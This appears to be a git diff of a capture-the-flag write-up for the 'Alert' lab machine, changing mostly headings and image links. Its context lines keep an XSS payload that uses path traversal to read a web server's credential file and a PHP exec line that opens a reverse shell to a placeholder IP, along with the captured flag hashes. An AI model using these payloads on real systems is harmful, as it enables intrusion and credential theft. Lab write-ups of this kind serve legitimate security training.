@@ -1,19 +1,15 @@
 ---
 sticker: emoji//1f534
 ---
+# ENUMERATION
+---
 
-# ALERT
+## OPEN PORTS
+---
 
-## ENUMERATION
-
-***
-
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | ssh     |
 | 80   | http    |
 
@@ -22,24 +18,23 @@ We need to add `alert.htb` to `/etc/hosts` in order to access the website
 `echo 'IP alert.htb' | sudo tee -a /etc/hosts`
 
 Nice, let's begin with reconnaissance.
-
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 When we first access the website, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110145426.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110145426.png)
 
 It is a markdown viewer website, we can only upload files with a `.md` extension, which is the markdown extension, let's upload a file and analyze its behavior using burp:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110150021.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110150021.png)
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
-The server basically processes the file with a function called `visualizer.php`, we need to upload a malicious `.md` file, I found we can perform \[\[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/LOCAL FILE INCLUSION (LFI).md|LFI]] let's reproduce these steps:
+
+The server basically processes the file with a function called `visualizer.php`, we need to upload a malicious `.md` file, I found we can perform [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/LOCAL FILE INCLUSION (LFI).md|LFI]] let's reproduce these steps:
 
 ```js
 <script>
@@ -52,6 +47,7 @@ fetch("http://alert.htp/messages.php?file=../../../../../../../var/www/statistic
 ```
 
 We are using `statistics.alert.htb` since I found that subdomain while fuzzing, it needed credentials.
+
 
 ```ad-hint
 1. Upload a markdown file with the script embedded above.
@@ -88,29 +84,32 @@ So, we got the following credentials:
 
 Let's log into ssh with the found credentials:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110155457.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110155457.png)
 
 We are able to read `user.txt`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110155516.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110155516.png)
 
 ```ad-important
 User: `c0ebbe25578f5ccb7a536e93d4e69238`
 ```
 
+
 Let's begin PRIVESC
 
-## PRIVILEGE ESCALATION
+# PRIVILEGE ESCALATION
+---
 
-***
 
 Let's run linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110160337.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110160337.png)
 
 First, there's something running on port `8080`, let's use ssh tunneling, but I also found something interesting:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110160647.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110160647.png)
 
 There's a directory that has root access, let's reproduce the following steps in order to get a root shell:
 
@@ -136,8 +135,9 @@ exec("/bin/bash -c 'bash -i >/dev/tcp/IP/PORT 0>&1'");
 
 We got a root shell, let's read flag:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250110161352.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250110161352.png)
 
 ```ad-important
 root: `f6a8586a751b4a7f1203d20b0fef1e6a`
 ```
+
